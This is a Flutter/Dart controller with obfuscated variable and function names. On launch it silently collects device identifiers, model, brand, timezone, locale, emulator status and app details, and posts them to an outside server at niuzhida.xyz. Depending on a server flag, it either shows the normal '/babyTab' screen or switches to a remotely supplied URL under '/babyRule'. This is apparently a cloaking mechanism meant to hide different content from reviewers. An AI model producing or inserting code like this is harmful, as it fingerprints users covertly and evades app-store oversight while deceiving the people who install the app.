import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var iuypxzrbv = RxBool(false);
  var rogtfseuzq = RxBool(true);
  var hinc = RxString("");
  var nola = RxBool(false);
  var prosacco = RxBool(true);
  final avfplqtyz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    igsmj();
  }


  Future<void> igsmj() async {

    nola.value = true;
    prosacco.value = true;
    rogtfseuzq.value = false;

    avfplqtyz.post("https://hapi.niuzhida.xyz/yqvlbaocmnetzgsxfdpwjiukhr",data: await fniqdos()).then((value) {
      var yinstehm = value.data["yinstehm"] as String;
      var bmcth = value.data["bmcth"] as bool;
      if (bmcth) {
        hinc.value = yinstehm;
        julius();
      } else {
        kemmer();
      }
    }).catchError((e) {
      rogtfseuzq.value = true;
      prosacco.value = true;
      nola.value = false;
    });
  }

  Future<Map<String, dynamic>> fniqdos() async {
    final DeviceInfoPlugin jrzo = DeviceInfoPlugin();
    PackageInfo uphyskw_veqpx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var csjfur = Platform.localeName;
    var jgdeu_AxNQdn = currentTimeZone;

    var jgdeu_ETShl = uphyskw_veqpx.packageName;
    var jgdeu_vERkgD = uphyskw_veqpx.version;
    var jgdeu_QEMl = uphyskw_veqpx.buildNumber;

    var jgdeu_QhDql = uphyskw_veqpx.appName;
    var juddHudson = "";
    var jgdeu_waTp  = "";
    var jgdeu_yRgvPxk = "";
    var prestonCassin = "";
    var jgdeu_kmvSc = "";
    var kathryneKreiger = "";
    var norvalLubowitz = "";


    var jgdeu_wHn = "";
    var jgdeu_NoTrXtU = false;

    if (GetPlatform.isAndroid) {
      jgdeu_wHn = "android";
      var ioptsfjazc = await jrzo.androidInfo;

      jgdeu_yRgvPxk = ioptsfjazc.brand;

      jgdeu_kmvSc  = ioptsfjazc.model;
      jgdeu_waTp = ioptsfjazc.id;

      jgdeu_NoTrXtU = ioptsfjazc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jgdeu_wHn = "ios";
      var tpfvusxhz = await jrzo.iosInfo;
      jgdeu_yRgvPxk = tpfvusxhz.name;
      jgdeu_kmvSc = tpfvusxhz.model;

      jgdeu_waTp = tpfvusxhz.identifierForVendor ?? "";
      jgdeu_NoTrXtU  = tpfvusxhz.isPhysicalDevice;
    }
    var res = {
      "jgdeu_QhDql": jgdeu_QhDql,
      "jgdeu_AxNQdn": jgdeu_AxNQdn,
      "jgdeu_QEMl": jgdeu_QEMl,
      "jgdeu_ETShl": jgdeu_ETShl,
      "jgdeu_kmvSc": jgdeu_kmvSc,
      "jgdeu_yRgvPxk": jgdeu_yRgvPxk,
      "jgdeu_waTp": jgdeu_waTp,
      "norvalLubowitz" : norvalLubowitz,
      "jgdeu_vERkgD": jgdeu_vERkgD,
      "csjfur": csjfur,
      "jgdeu_NoTrXtU": jgdeu_NoTrXtU,
      "jgdeu_wHn": jgdeu_wHn,
      "kathryneKreiger" : kathryneKreiger,
      "prestonCassin" : prestonCassin,
      "juddHudson" : juddHudson,

    };
    return res;
  }

  Future<void> kemmer() async {
    Get.offAllNamed("/babyTab");
  }

  Future<void> julius() async {
    Get.offAllNamed("/babyRule");
  }

}
